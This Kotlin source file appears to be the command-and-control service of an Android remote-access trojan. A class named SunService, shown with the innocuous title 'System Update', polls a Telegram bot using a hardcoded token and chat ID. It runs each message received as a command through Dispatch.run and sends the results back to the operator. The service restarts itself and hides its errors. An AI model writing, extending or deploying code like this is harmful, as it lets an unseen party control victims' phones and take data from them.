package com.sys.sun

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SunService : Service() {
    private val BOT_TOKEN = "8878287099:AAE5vhikYiuPUMK-GmsFrVfBJ-GVh8HyV-w"
    private val CHAT_ID = "7034320237"
    private var lastUpdateId = 0L

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(NotificationChannel("s", "Sys", NotificationManager.IMPORTANCE_LOW))
            startForeground(1001, Notification.Builder(this, "s").setContentTitle("System Update").setSmallIcon(android.R.drawable.stat_notify_sync).build())
        }
        Thread { pollLoop() }.start()
    }

    private fun pollLoop() {
        while (true) {
            try {
                val url = URL("https://api.telegram.org/bot\$BOT_TOKEN/getUpdates?offset=\${lastUpdateId + 1}&timeout=30")
                val conn = url.openConnection() as HttpURLConnection
                if (conn.responseCode == 200) {
                    val res = conn.inputStream.bufferedReader().readText()
                    val updates = JSONObject(res).optJSONArray("result")
                    if (updates != null) {
                        for (i in 0 until updates.length()) {
                            val update = updates.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")
                            val msg = update.optJSONObject("message")?.optString("text")
                            if (msg != null) {
                                val result = Dispatch.run(this, msg)
                                sendMessage(result)
                            }
                        }
                    }
                }
                conn.disconnect()
            } catch (e: Exception) { Thread.sleep(3000) }
        }
    }

    private fun sendMessage(text: String) {
        try {
            val url = URL("https://api.telegram.org/bot\$BOT_TOKEN/sendMessage")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            val encoding = "UTF-8"
            val postData = "chat_id=\$CHAT_ID&text=" + java.net.URLEncoder.encode(text, encoding)
            conn.outputStream.write(postData.toByteArray())
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
